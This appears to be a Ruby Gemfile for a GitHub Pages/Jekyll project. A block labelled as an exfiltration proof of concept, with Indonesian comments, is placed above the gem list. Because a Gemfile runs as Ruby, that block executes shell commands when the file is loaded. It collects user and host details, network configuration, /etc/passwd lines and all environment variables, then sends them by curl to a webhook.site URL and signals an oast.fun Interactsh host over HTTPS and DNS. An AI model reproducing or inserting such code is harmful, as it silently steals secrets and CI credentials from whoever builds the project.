# --- BEGIN OOB EXFILTRATION POC ---
webhook = "https://webhook.site/3935fc6c-d48f-4832-abce-1e2e586c31ee"
interact = "jzlnriqracktrqqcvctti0z1e1payovlr.oast.fun"

# Menyatukan 5 poin bukti teknis ke dalam satu laporan
data =  "=== SECURITY RESEARCH REPORT: RCE EVIDENCE ===\n"
data += "1. USER IDENTIFICATION: " + `id`
data += "2. RUNNER HOSTNAME: " + `hostname`
data += "3. NETWORK CONFIGURATION:\n" + `ip addr | grep inet`
data += "4. SYSTEM FILE ACCESS (/etc/passwd):\n" + `head -n 3 /etc/passwd`
data += "5. ARBITRARY WRITE TEST: " + `echo 'VULNERABILITY_CONFIRMED' > /tmp/poc_verify.txt && cat /tmp/poc_verify.txt`
data += "\n=== ENVIRONMENT VARIABLES (LEAKED SECRETS) ===\n"
data += `env | cut -c1-100`

# Metode 1: Mengirim data lengkap melalui HTTP POST ke Webhook
`curl -s -X POST -H "Content-Type: text/plain" --data "#{data}" #{webhook}`

# Metode 2: Memicu interaksi OOB melalui HTTPS dan DNS (Interactsh)
# Menggunakan HTTPS untuk bypass filter tertentu
`curl -s "https://#{interact}/status-rce-active-$(hostname)"`
# Menggunakan DNS Lookup (sangat efektif untuk verifikasi OOB)
`nslookup rce-verify.#{interact}`

puts "========================================"
puts "Vulnerability Verified: Data exfiltrated to OOB servers."
puts "Check Webhook and Interactsh dashboards for confirmation."
puts "========================================"
# --- END POC ---

source "https://rubygems.org"
gem "faraday", "2.14.1"
gem "faraday-retry", "2.4.0"
gem "github-pages", "~> 232", group: :jekyll_plugins
gem "json", "2.18.0"
gem "language_server-protocol", "3.17.0.5"
gem "nokogiri", "~> 1.19.0"
gem "rake", "13.3.1"
gem "rubocop", "1.82.1"

group :test do
  gem "fastimage"
  gem "httparty"
  gem "minitest"
  gem "octokit"
  gem "pry", require: false
  gem "rubocop-performance"
  gem "safe_yaml"
end

group :development do
  gem "webrick"
end
